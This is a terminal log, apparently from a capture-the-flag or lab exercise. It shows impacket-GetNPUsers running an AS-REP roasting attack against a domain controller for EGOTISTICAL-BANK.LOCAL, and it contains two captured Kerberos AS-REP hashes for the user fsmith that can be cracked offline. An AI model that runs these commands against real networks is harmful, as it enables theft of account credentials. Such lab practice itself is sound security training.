```sh
└─$ impacket-GetNPUsers -outputfile asreproast.txt -ts -dc-ip '10.129.95.180' -no-pass 'EGOTISTICAL-BANK.LOCAL/fsmith' -debug 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-07-30 06:27:34] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-07-30 06:27:34] [*] Getting TGT for fsmith
[2025-07-30 06:27:34] [+] Trying to connect to KDC at 10.129.95.180:88
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:b86517133043618f4b6aca6f0d97bed5$96e50d70ac316a65c724862915e51eca0ee6868fb128ec0f6dc46efded57f0de86e75e1d75ce72a6a737057053c6eb2644092bab36a64d97590e4682c5f3e452e6ff7be00aa3810edc8b0981357c0f9ed143e5c20a02b04b58f199b68f40aa4f4328a832efc773c94d942cb32bdc276037db142fe021438fb1a2d062fb482c40546358f94192c1cf7ae9738eb78478860ca40fb4d1ceaceb945ea7c563ce6bf71a426b952a3c9c22c27af78cca5e1d72c86778f8d7c0d43b1b56fe2bbb75baeba1bbe46d90e5ff26fb8f92406826c743e5975a731f0b4febb109c4ef91b12b62f65ff146718b6d3ecea6756e57c3e7dd5ce8e8fdbc1743854ec9f0dfc0cbc62f


└─$ impacket-GetNPUsers -outputfile asreproast.txt -ts -dc-ip '10.129.95.180' -usersfile user.txt 'EGOTISTICAL-BANK.LOCAL/' -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-07-30 06:07:02] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-07-30 06:07:02] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:03] [+] Server time (UTC): 2025-07-30 17:07:03
[2025-07-30 06:07:03] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:03] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:04] [+] Server time (UTC): 2025-07-30 17:07:05
[2025-07-30 06:07:04] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:04] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:05] [+] Server time (UTC): 2025-07-30 17:07:06
[2025-07-30 06:07:05] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:05] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:07] [+] Server time (UTC): 2025-07-30 17:07:08
[2025-07-30 06:07:07] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:07] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:08] [+] Server time (UTC): 2025-07-30 17:07:09
[2025-07-30 06:07:08] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:08] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:10] [+] Server time (UTC): 2025-07-30 17:07:10
[2025-07-30 06:07:10] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:10] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:11] [+] Server time (UTC): 2025-07-30 17:07:11
[2025-07-30 06:07:11] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:11] [+] Trying to connect to KDC at 10.129.95.180:88
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:4699f27f29b6ed010a42b58819aabf16$2d55add04f0cd69b29f78000be8544a4e8ec80488c2bc64a49c800b1ae0dee20b0125b949fae1c99085049f81101e1a3ebba19c58dae47fc4c4f3f9fb19dc828ffddf24a2a4a131a51117f927d9ddb3db283eea2fb49f215fdfe42368f08ae866313b177105a8dbfd1e495f911e1a646a0ddecd94744e5a63f068e39e593c0d2faf7fc5cdff30e8e94247a4270744a55e7f7407655d08f6ae4cec29a270f037124c905cbe8f66a82a63cf13486c40e1c84aee33c105e5c006710868ccaee87bd44b83a6a315065f1a4cf6f3230ac119d64d24fdef08c49458d0c14ea655d73a02056f1b30d8a66f980b8f3d7db419be3076aadabd98832932ad43fa704633eea
[2025-07-30 06:07:13] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:14] [+] Server time (UTC): 2025-07-30 17:07:14
[2025-07-30 06:07:14] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:14] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:15] [+] Server time (UTC): 2025-07-30 17:07:16
[2025-07-30 06:07:15] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```
